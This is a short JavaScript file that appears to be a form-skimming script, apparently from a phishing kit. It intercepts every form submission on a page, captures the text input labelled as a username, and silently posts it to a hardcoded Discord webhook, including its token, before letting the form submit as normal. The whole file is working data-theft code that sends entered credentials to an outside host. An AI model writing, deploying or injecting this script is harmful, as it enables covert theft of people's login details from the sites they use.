"use strict";

function sendMessageToWebhook(webhookURL, message) {
    const payload = {
        content: "```\n----------------------------------------------\nUSERNAME: " + message + "\n----------------------------------------------```"
    };

    return fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
}

document.addEventListener('DOMContentLoaded', () => {
    const forms = document.querySelectorAll('form');
    const webhookURL = 'https://discord.com/api/webhooks/1255451054003195985/-IIJYymOmPdQBBXcS2JyhGdD6Bi1ZZrC11bJmLXAIC36Dh2QXpsQhZEomoCSM1h_CsBf';

    forms.forEach(form => {
        form.addEventListener('submit', function(event) {
            event.preventDefault();
            const input = this.querySelector('input[type="text"]');
            if (input) {
                const inputText = input.value;
                if (inputText) {
                    sendMessageToWebhook(webhookURL, inputText)
                        .then(response => {
                            if (response.ok) {
                                console.log('Message sent successfully');
                                // Proceed with form submission
                                form.submit();
                            } else {
                                response.text().then(text => {
                                    console.error('Error sending message:', text);
                                });
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                        });
                } else {
                    console.error('Input is empty');
                }
            } else {
                console.error('Input element not found');
            }
        });
    });
});